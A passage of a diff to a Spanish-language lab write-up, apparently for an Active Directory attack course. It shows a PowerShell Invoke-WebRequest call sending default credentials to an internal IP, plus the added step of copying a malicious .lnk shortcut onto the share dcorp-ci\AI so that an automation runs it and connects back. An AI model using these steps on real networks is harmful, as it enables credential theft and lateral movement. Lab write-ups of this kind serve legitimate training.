@@ -289,3 +289,9 @@ Una vez ejecutado en nuestra maquina virtual deberemos de crear en la ruta de AD
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.97' -UseDefaultCredentials"
 ```
 
+Y lo copiaremos al recurso compartido dcoro-ci\AI
+```shell
+xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
+```
+
+La automatización ejecutara el archivo y se creara una conexión
